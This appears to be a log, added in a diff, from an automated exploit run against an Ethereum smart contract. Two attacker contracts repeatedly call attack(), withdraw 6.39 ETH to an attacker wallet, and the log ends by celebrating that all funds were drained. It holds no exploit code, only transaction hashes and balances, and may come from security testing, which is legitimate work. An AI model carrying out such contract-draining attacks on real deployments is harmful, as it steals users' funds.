+[2025-10-01 14:46:30.993] [info] ROUND 316: attack() call in contract 2 | Tx: 0xaa97411800188d0a0fc7bbc91fc5d188b0be1aebc724f206f5b34115be207a8b
+[2025-10-01 14:46:30.993] [info] ROUND 317: attack() call in contract 1 | Tx: 0x816509ed60f8bf34ea9d4a8c4f3f076004e32928bdb1966d027aec72dfbf45e0
+[2025-10-01 14:46:30.993] [info] ROUND 318: attack() call in contract 2 | Tx: 0x74d345340cd49443651ec2961c7ac0531753e21d0c839d91c071d8078a713bcd
+[2025-10-01 14:46:30.993] [info] ROUND 319: attack() call in contract 1 | Tx: 0xe4f337c56927785fb9b28884d151d802456bca5326933bfa8886dc76f88ef129
+[2025-10-01 14:46:30.993] [info] ROUND 320: attack() call in contract 2 | Tx: 0x6b2aa08e64e2ef893cdf3043cef85edaedef196221a9a723fd0f49973b747916
+[2025-10-01 14:46:30.993] [info] ROUND 321: attack() call in contract 1 | Tx: 0x244a388f8f4ea62b4019d1ac9ceef85716f7484545dda863310eecd565462b31
+[2025-10-01 14:46:30.993] [info] ROUND 322: attack() call in contract 2 | Tx: 0x0cf94ca285c59c00ed55729ca9baf69822041455cdc1a343c941ea63555a313e
+[2025-10-01 14:46:30.993] [info] ROUND 323: attack() call in contract 1 | Tx: 0x596466f08d43fb2a8652873c0719bf4ffd4ecf262a12ea6c268252651e31500d
+[2025-10-01 14:46:30.993] [info] Successfully sent 323/323 transactions
+[2025-10-01 14:46:35.941] [warning] ROUND 321 tx reverted
+[2025-10-01 14:46:35.941] [warning] ROUND 322 tx reverted
+[2025-10-01 14:46:35.942] [warning] ROUND 323 tx reverted
+[2025-10-01 14:46:35.942] [info] Completed 320 attack rounds
+[2025-10-01 14:46:35.942] [info] Attack duration: 9101.31ms
+[2025-10-01 14:46:38.206] [info] Round 320 summary: Vulnerable = 0.00 ETH | AttackerC_1 = 3.19 ETH | AttackerC_2 = 3.20 ETH | Total_stolen = 6.39 ETH
+
+[2025-10-01 14:46:38.207] [info] - ATTACKER CONTRACTS WITHDRAWAL -
+[2025-10-01 14:46:38.387] [info] Attacker contract 2 balance: 3.20 ETH
+[2025-10-01 14:46:38.475] [info] Attacker contract 1 balance: 3.19 ETH
+[2025-10-01 14:46:39.540] [info] Withdrawal transaction for Attacker contract 1: 0x4fdd54438cd1ff821fafad7a9c7e310bc36a746e777029104909f342ed3ea3f2
+[2025-10-01 14:46:39.540] [info] Withdrawal transaction for Attacker contract 2: 0x47ea18573c40fe90bc282e1528289ab93c5200a2445d319f9b2807dd9a7a4cc0
+[2025-10-01 14:46:39.540] [info] Sent 2/2 withdrawal transactions, waiting for confirmations...
+[2025-10-01 14:46:39.638] [info] Successfully withdrew funds from all 2 contracts
+[2025-10-01 14:46:39.638] [info] Total withdrawn: 6.39 ETH
+
+[2025-10-01 14:46:44.381] [info] - FINAL RESULTS -
+[2025-10-01 14:46:44.381] [info] Initial Attacker wallet balance: 0.05 ETH
+[2025-10-01 14:46:44.381] [info] Final Attacker wallet balance: 6.44 ETH
+[2025-10-01 14:46:44.381] [info] Net wallet gain: + 6.39 ETH
+[2025-10-01 14:46:44.381] [info] Total stolen from Vulnerable contract: 6.39 ETH
+[2025-10-01 14:46:44.381] [info] Drain efficiency: 100.00%
+[2025-10-01 14:46:44.381] [info] Attack successful! All funds drained from the vulnerable contract :)
